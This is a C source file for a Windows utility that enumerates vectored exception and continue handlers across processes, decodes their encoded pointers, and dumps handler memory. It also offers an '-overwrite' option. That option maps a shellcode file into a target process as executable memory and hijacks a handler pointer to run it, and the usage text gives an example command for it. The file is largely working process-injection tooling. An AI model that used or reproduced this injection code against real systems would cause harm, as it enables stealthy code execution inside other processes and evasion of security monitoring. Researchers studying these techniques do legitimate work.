#include "header.h"
#include <stdio.h>

GLOBAL Global = { 0 };

PVOID DecodePointerRemote(PVOID pointer, DWORD cookie) {
	return (PVOID)(RotateRight64((ULONG_PTR)pointer, 0x40 - (cookie & 0x3f)) ^ cookie);
}

PVOID EncodePointerRemote(PVOID pointer, DWORD cookie) {
	return (PVOID)(RotateLeft64((ULONG_PTR)pointer ^ cookie, 0x40 - (cookie & 0x3f)));
}

NTSTATUS EnableDebug() {

	NTSTATUS	STATUS = 0x00;
	BOOL		bOldPriv;

	fnRtlAdjustPrivilege pRtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(Global.pNtdll, "RtlAdjustPrivilege");

	STATUS = pRtlAdjustPrivilege(0x20, TRUE, FALSE, &bOldPriv);

	return STATUS;
}

PVOID HandlerList() {

	PBYTE   pNext = NULL;
	PBYTE   pRtlpAddVectoredHandler = NULL;
	PBYTE   pVehList = NULL;
	int     offset = 0;
	int     i = 1;

	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(Global.pNtdll, "RtlAddVectoredExceptionHandler");

	if (!pRtlAddVectoredExceptionHandler)
		return NULL;

	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;

	while (TRUE) {

		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {

			if (i == 2) {
				offset = *(int*)(pRtlpAddVectoredHandler + 3);
				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
				pVehList = pNext + offset;
				return pVehList;
			}
			else {
				i++;
			}
		}

		pRtlpAddVectoredHandler++;
	}

	return NULL;
}

VOID GetLocation(HANDLE hTestSubject, PVOID pAddress, int index, LPCWSTR type) {

	UNICODE_STRING* pName;
	SIZE_T			ret;
	NTSTATUS		STATUS = 0x00;
	PVOID			pTmp = NULL;
	PVOID			pFree = NULL;
	HANDLE			hFile = NULL;

	pName = HeapAlloc(GetProcessHeap(), 0, 0x1000);

	STATUS = Global.pNtQueryVirtualMemory(hTestSubject, pAddress, MemoryMappedFilenameInformation, pName, 0x1000, &ret);

	if (!NT_SUCCESS(STATUS)) {
		printf("[!] NtQueryVirtualMemory failed: 0x%0.8X\n", STATUS);
	}
	else {
		printf("[+] Location: %wZ\n", pName);
	}

	if (Global.dwDump) {

		DWORD	dwBytesWritten = NULL;
		WCHAR	filename[120];

		DWORD pid = GetProcessId(hTestSubject);

		swprintf(filename, 100, L"%d-%s-%d.bin", pid, type, index);
		wprintf(L"[+] Name: %s\n", filename);

		hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			printf("[!] Error creating dump file: %ld\n", GetLastError());
			goto _End;
		}
		else {

			pTmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Global.dwDump);
			pFree = pTmp;

			if (!ReadProcessMemory(hTestSubject, pAddress, &pTmp, Global.dwDump, NULL)) {
				printf("[!] Error reading handler: %ld\n", GetLastError()); goto _End;
			}

			if (!WriteFile(hFile, &pTmp, Global.dwDump, &dwBytesWritten, NULL) || Global.dwDump != dwBytesWritten) {
				printf("[!] Error writing dump file: %ld\n", GetLastError()); goto _End;
			}
		}
	}

_End:

	if (pName)
		HeapFree(GetProcessHeap(), 0, pName); pName = NULL;

	if (pFree)
		HeapFree(GetProcessHeap(), 0, pFree); pFree = NULL;

	if (hFile)
		CloseHandle(hFile);

	return;
}

BOOL OverWriteHandler(HANDLE hProc, PVOID pHandlerEntry, DWORD dwCookie) {

	NTSTATUS	STATUS;
	HANDLE		hSection = NULL;
	PVOID		pAddrLocal = NULL;
	PVOID		pAddrRemote = NULL;
	SIZE_T		rand = 0;
	DWORD		dwOld = 0;

	fnNtCreateSection	 pNtCreateSection = (fnNtCreateSection)GetProcAddress(Global.pNtdll, "NtCreateSection");
	fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(Global.pNtdll, "NtMapViewOfSection");

	HANDLE hFile = CreateFileW(Global.lpPayload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
		printf("[!] Error opening payload file: %ld\n", GetLastError());
		return FALSE;
	}

	LARGE_INTEGER li = { 0 };

	if (!GetFileSizeEx(hFile, &li)) {
		printf("[!] Error getting payload file size: %ld\n", GetLastError());
		return FALSE;
	}

	LARGE_INTEGER li2 = { .HighPart = 0, .LowPart = li.QuadPart };

	STATUS = pNtCreateSection(&hSection, SECTION_RWX, NULL, &li2, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] Creating section failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	STATUS = pNtMapViewOfSection(hSection, (HANDLE)-1, &pAddrLocal, NULL, NULL, NULL, &rand, 2, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] Mapping local view failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	if (!ReadFile(hFile, pAddrLocal, li.QuadPart, NULL, NULL)) {
		printf("[!] Error reading payload file: %ld\n", GetLastError());
		return FALSE;
	}

	STATUS = pNtMapViewOfSection(hSection, hProc, &pAddrRemote, NULL, NULL, NULL, &rand, 1, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] Mapping remote view failed: 0x%0.8X\n", STATUS);
		return FALSE;
	}

	PVOID pNewHandler = EncodePointerRemote(pAddrRemote, dwCookie);
	PVOID pLocation = (ULONG_PTR)pHandlerEntry + 32;

	if (!VirtualProtectEx(hProc, pLocation, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &dwOld)) {
		printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProc, pLocation, &pNewHandler, sizeof(PVOID), &rand)) {
		printf("[!] Error overwriting pointer: %ld\n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProc, pLocation, sizeof(PVOID), dwOld, &dwOld)) {
		printf("[!] VirtualProtectEx failed: %ld\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL VerifyHandler(HANDLE hProc, int type, int idx) {

	VECTORED_HANDLER_LIST	handler_list = { 0 };
	VEH_HANDLER_ENTRY		handler_entry = { 0 };
	PVOID					pDecodedPointer = NULL;
	NTSTATUS				STATUS = 0x00;
	DWORD					cookie = 0;
	SIZE_T					ret = 0;
	PVOID					pHandler = NULL;

	if (type > 1 || type < 0) {
		printf("[!] Wrong type specified, you specified: %d\n", type);
		return;
	}

	if (!ReadProcessMemory(hProc, Global.pHandlerList, &handler_list, sizeof(VECTORED_HANDLER_LIST), NULL)) {
		printf("[!] Error getting VEH list: %ld\n", GetLastError());
		return FALSE;
	}

	if (type == 0 && handler_list.FirstExceptionHandler != Global.pVehStart) {

		STATUS = Global.pNtQueryInformationProcess(hProc, 0x24, &cookie, sizeof(DWORD), &ret);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] Getting cookie failed: 0x%0.8X\n", STATUS);
			return FALSE;
		}

		pHandler = handler_list.FirstExceptionHandler;
		int index = 1;

		while (TRUE) {

			if (!ReadProcessMemory(hProc, pHandler, &handler_entry, sizeof(VEH_HANDLER_ENTRY), NULL)) {
				printf("[!] Error getting VEH entry: %ld\n", GetLastError());
				break; return FALSE;
			}

			if (Global.bOverWrite && index == idx) {
				OverWriteHandler(hProc, pHandler, cookie);
			}

			pDecodedPointer = DecodePointerRemote(handler_entry.VectoredHandler, cookie);
			printf("\n[+] Decoded VEH pointer: 0x%p\n", pDecodedPointer);

			GetLocation(hProc, pDecodedPointer, index, L"VEH");

			if (handler_entry.Entry.Flink == Global.pVehStart) {
				break;
			}

			pHandler = handler_entry.Entry.Flink;
			index++;
		}
		return TRUE;
	}

	if (type == 1 && handler_list.FirstContinueHandler != Global.pVchStart) {

		STATUS = Global.pNtQueryInformationProcess(hProc, 0x24, &cookie, sizeof(DWORD), &ret);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] Getting cookie failed: 0x%0.8X\n", STATUS);
			return FALSE;
		}

		pHandler = handler_list.FirstContinueHandler;
		int index = 1;

		while (TRUE) {

			if (!ReadProcessMemory(hProc, pHandler, &handler_entry, sizeof(VEH_HANDLER_ENTRY), NULL)) {
				printf("[!] Error getting VEH entry: %ld\n", GetLastError());
				break; return FALSE;
			}

			if (Global.bOverWrite && index == idx) {
				OverWriteHandler(hProc, pHandler, cookie);
			}

			pDecodedPointer = DecodePointerRemote(handler_entry.VectoredHandler, cookie);
			printf("\n[+] Decoded VCH pointer: 0x%p\n", pDecodedPointer);

			GetLocation(hProc, pDecodedPointer, index, L"VCH");

			if (handler_entry.Entry.Flink == Global.pVchStart) {
				break;
			}

			pHandler = handler_entry.Entry.Flink;
			index++;
		}
		return TRUE;
	}
	else {
		return FALSE;
	}
}

NTSTATUS EnumAll(int type) {

	NTSTATUS					STATUS = 0x00;
	ULONG						ret = 0;
	SYSTEM_PROCESS_INFORMATION* pProcInfo = NULL;
	PVOID						pFreeLater = NULL;
	HANDLE						hTarget = NULL;

	STATUS = Global.pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ret);
	ret += 1 << 12;
	pProcInfo = (SYSTEM_PROCESS_INFORMATION*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ret);
	pFreeLater = pProcInfo;

	STATUS = Global.pNtQuerySystemInformation(SystemProcessInformation, pProcInfo, ret, &ret);

	if (!NT_SUCCESS(STATUS)) {
		printf("[!] NtQuerySystemInformation failed: 0x%0.8X\n", STATUS);
		return STATUS;
	}

	while (TRUE) {

		hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pProcInfo->UniqueProcessId);

		if (hTarget == NULL || hTarget == INVALID_HANDLE_VALUE) {

			pProcInfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
			continue;
		}

		if (VerifyHandler(hTarget, type, 0)) {
			wprintf(L"[+] Process: %ls\n", pProcInfo->ImageName.Buffer);
		}

		if (!pProcInfo->NextEntryOffset)
			break;

		pProcInfo = (SYSTEM_PROCESS_INFORMATION*)((ULONG_PTR)pProcInfo + pProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pFreeLater); pProcInfo = NULL; pFreeLater = NULL;

	return STATUS;
}

int wmain() {

	int argc;
	DWORD dwTarget;
	HANDLE hTarget = NULL;
	NTSTATUS STATUS = 0x00;
	LPWSTR cmdline = GetCommandLineW();
	LPWSTR* argv = CommandLineToArgvW(cmdline, &argc);

	if (argc <= 1) {
		printf("\n-debug: Enable SeDebug\n-proc <pid>: Enum both VCH & VEH in a given process\n-enum-vch: Enum all processes with VCH(s)\n-enum-veh: Enum all processes with VEH(s)\n-dump <bytes>: Dump X bytes of found handler function(s) in a given process (use -proc)\n");
		printf("-overwrite <type> <index> <payload_file>: Overwrite VEH (type 0)/VCH (type 1) at specified index (1 is first handler and so on) in a given process (use -proc) with specified shellcode\n\n");
		printf("Example1: VectoredUtil.exe -proc 1220 -dump 100\n");
		printf("Example2: VectoredUtil.exe -proc 1220 -overwrite 0 1 C:\\payload.bin\n");
		printf("Example3: VectoredUtil.exe -enum-veh\n");
		return -1;
	}

	Global.pNtdll = GetModuleHandle(TEXT("NTDLL.DLL"));
	Global.pHandlerList = HandlerList();
	Global.pVehStart = (ULONG_PTR)Global.pHandlerList + 8;
	Global.pVchStart = (ULONG_PTR)Global.pHandlerList + 32;
	Global.bOverWrite = FALSE;
	Global.pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(Global.pNtdll, "NtQueryInformationProcess");
	Global.pNtQueryVirtualMemory = (fnNtQueryVirtualMemory)GetProcAddress(Global.pNtdll, "NtQueryVirtualMemory");
	Global.pNtQuerySystemInformation = (fnNtQuerySysteminformation)GetProcAddress(Global.pNtdll, "NtQuerySystemInformation");

	for (int i = 0; i < argc; i++) {

		wchar_t* arg = argv[i];

		if (wcscmp(arg, L"-debug") == 0) {

			STATUS = EnableDebug();

			if (!NT_SUCCESS(STATUS)) {
				printf("[!] Error setting SeDebug: 0x%0.8X\n", STATUS);
				return -1;
			}
		}
		else if (wcscmp(arg, L"-proc") == 0 && i + 1 < argc) {

			dwTarget = _wtoi(argv[i + 1]);
			hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTarget);

			if (hTarget == NULL || hTarget == INVALID_HANDLE_VALUE) {
				printf("[!] Opening handle to target failed: %ld\n", GetLastError());
				return -1;
			}

			int j = i += 2;

			while (j < argc) {

				arg = argv[j];

				if (wcscmp(arg, L"-dump") == 0 && j + 1 < argc) {

					Global.dwDump = _wtoi(argv[j + 1]);
					VerifyHandler(hTarget, 0, 0);
					VerifyHandler(hTarget, 1, 0);
					return 0;
				}
				else if (wcscmp(arg, L"-overwrite") == 0 && j + 3 < argc) {

					Global.bOverWrite = TRUE;
					int type = _wtoi(argv[j + 1]);
					int idx = _wtoi(argv[j + 2]);
					Global.lpPayload = argv[j + 3];
					VerifyHandler(hTarget, type, idx);
					return 0;
				}
			}
			VerifyHandler(hTarget, 0, 0);
			VerifyHandler(hTarget, 1, 0);
		}
		else if (wcscmp(arg, L"-enum-veh") == 0) {

			STATUS = EnumAll(0);

			if (!NT_SUCCESS(STATUS)) {
				return -1;
			}
		}
		else if (wcscmp(arg, L"-enum-vch") == 0) {

			STATUS = EnumAll(1);

			if (!NT_SUCCESS(STATUS)) {
				return -1;
			}
		}
	}
}
